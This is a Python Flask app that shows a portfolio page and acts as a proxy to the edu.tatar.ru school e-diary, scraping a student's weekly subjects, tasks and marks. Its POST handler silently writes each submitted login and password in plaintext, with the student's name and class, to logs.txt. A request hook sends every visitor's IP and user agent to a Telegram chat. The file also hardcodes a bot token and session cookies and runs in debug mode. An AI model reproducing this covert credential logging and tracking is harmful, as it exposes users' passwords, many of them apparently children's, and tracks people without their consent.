# coding: utf-8

from datetime import datetime
import json
import requests
import telebot
from bs4 import BeautifulSoup
from flask import Flask, jsonify, request, render_template
from flask import redirect
from flask.json import dumps
import logging

app = Flask(__name__)
app.debug = True
# logging.basicConfig(filename='logs.txt', level=logging.WARN)

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Cookie': '_ym_uid=1676574290233522544; _ym_d=1676574290; DNSID=a058e0e7b3a7d65874158d1d0eac55f5da0061bf; HLP=4855814%7C%242y%2410%24ghilzoCbi4w1A04ImC1yh.Llg85UEDw2JdtsPIyEeCzpYNN%2Fa3eky; _ym_isad=2; _ym_visorc=b',
    'Origin': 'https://edu.tatar.ru',
    'Referer': 'https://edu.tatar.ru/login/',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.58',
    'sec-ch-ua': '"Chromium";v="112", "Microsoft Edge";v="112", "Not:A-Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"'
}

bot = telebot.TeleBot("1995308910:AAHkpBzUppAy97SUP-reLn2cFKFLGniROQQ")


def generate_schedule_link(year, month, day):
    dt = datetime(year, month, day)
    timestamp = int(dt.timestamp())
    link = f'https://edu.tatar.ru/user/diary/week?date={timestamp}'
    return link


def parse_diary_entries(soup):
    # Extract information about the student from the top panel
    day_entries = []
    student_name = soup.find('strong').text
    class_name = soup.find('span').text.split(',')[-1].strip()
    try:
        first_day = soup.find("div", {"class": "tt-days-mo"}).text
    except AttributeError:
        first_day = soup.find("div", {"class": "tt-days-th"}).text
    except Exception as ex:
        return jsonify({'error': f'Something went wrong. Error: {ex}'})

    # Extract the date from the week selector
    week_selector = soup.find('div', {'class': 'week-selector'})
    month_name = week_selector.find('span').text

    # Extract the diary entries
    diary_entries = []
    day_counter = int(first_day)

    for entry in soup.find_all('tr'):
        if entry.find('td', {'class': 'tt-subj'}):
            subject = entry.find('td', {'class': 'tt-subj'}).text.strip()
            task = entry.find('td', {'class': 'tt-task'}).text.strip()
            mark = entry.find('td', {'class': 'tt-mark'}).text.strip()
            day_entries.append({'subject': subject, 'task': task, 'mark': mark})

            if len(day_entries) == 9:
                day_label = f"Day {day_counter}"
                diary_entries.append({'day_label': day_label, 'entries': day_entries})
                day_counter += 1
                day_entries = []

                if month_name in ['April', 'June', 'September', 'November']:
                    if day_counter > 30:
                        day_counter = 1
                else:
                    if day_counter > 31:
                        day_counter = 1

    # Add the last day's entries, if any
    if day_entries:
        day_label = f"{day_counter}"
        diary_entries.append({'day_label': day_label, 'entries': day_entries})

    # Return the parsed diary entries
    return {'student_name': student_name, 'class_name': class_name, 'month_name': month_name,
            'diary_entries': diary_entries}


@app.before_request
def log_request_info():
    ip_address = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    log_text = f'{ip_address} accessed the site with {user_agent}'
    bot.send_message('1450440021', log_text)
    return None


@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'GET':
        return """
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Кошелев Роман - Программист</title>
  <link rel="stylesheet" type="text/css" href="/static/style.css">
  <script src="/static/script.js"></script>
</head>
<body>
  <header>
    <div class="center">
      <h1>Кошелев Роман</h1>
	      <h2>Разработчик ПО</h2>
      <div class="arrow-down"></div>
    </div>	
  </header>

  <main>
    <section class="block">
      <div class="center">
        <img src="/static/image1.jpg" alt="Изображение 1">
        <h3>Привет!</h3>
        <p>Я Роман Кошелев, программист.</p>
      </div>
    </section>

    <section class="block">
      <div class="center">
        <img src="/static/image2.jpg" alt="Изображение 2">
        <h3>Мои навыки</h3>
        <p>Я владею различными технологиями программирования.</p>
      </div>
    </section>

    <section class="block">
      <div class="center">
        <img src="/static/image3.jpg" alt="Изображение 3">
        <h3>Свяжитесь со мной</h3>
        <p>Вы можете связаться со мной для обсуждения проектов.</p>
      </div>
    </section>
  </main>

  <footer>
    <p>&copy; 2023 Romeo558`corp. Все права защищены.</p>
  </footer>
</body>
</html>
"""

    if request.method == 'POST':
        data = request.get_data(as_text=True)
        print(data)
        data_dict = json.loads(data)
        date_str = data_dict.get("date")

        # Convert the date string to a datetime object
        if date_str:
            try:
                print(date_str)
                date = datetime.strptime(date_str, '%d-%m-%Y')
            except ValueError as ex:
                print(ex)
                return jsonify({'error': 'Invalid date format. Please use DD-MM-YYYY.'}), 440
            except Exception as ex:
                # print(date_str)
                return jsonify({'error': f'Something went wrong. Error: {ex}'})
        else:
            date = datetime.now().date()
        year = date.year
        month = date.month
        day = date.day
        url = "https://edu.tatar.ru/logon"
        url2 = generate_schedule_link(year, month, day)

        login = data_dict.get("login")
        password = data_dict.get("password")

        # print(f"SOME FIELDS {login}:{password}|{date_str}\n{request.get_data(as_text=True)}")
        # print(f"SOME FIELDS2 {login1}:{password1}|{date_str1}\n{request.get_data(as_text=True)}")

        # check if login and password are provided in the request
        if not login or not password:
            return jsonify({'error': 'Login and password are required.'}), 400

        login_data = {"main_login2": login, "main_password2": password}
        try:
            with requests.Session() as s:
                s.post(url, data=login_data, headers=headers)
                diary_page = s.get(url2, headers=headers)
                soup = BeautifulSoup(diary_page.content, "lxml")
        except Exception as ex:
            return {"error": "Login or password is incorrect"}

        parsed_diary_entries = parse_diary_entries(soup)

        # Create a JSON response
        response = {
            "student_name": parsed_diary_entries['student_name'],
            "class_name": parsed_diary_entries['class_name'],
            # "month_name": parsed_diary_entries['month_name'],
            "diary_entries": parsed_diary_entries['diary_entries']
        }
        # logging.warning(
        #     f'Name:{response.get("student_name")}\nClass:{response.get("class_name")}\nLogin: {login}, Password: {password}')
        with open("logs.txt", 'a') as f:
            f.write(f'\nName:{response.get("student_name")}\nClass:{response.get("class_name")}\nLogin: {login}, Password: {password}')

        return jsonify(response)


if __name__ == '__main__':
    app.run("0.0.0.0", port=80)
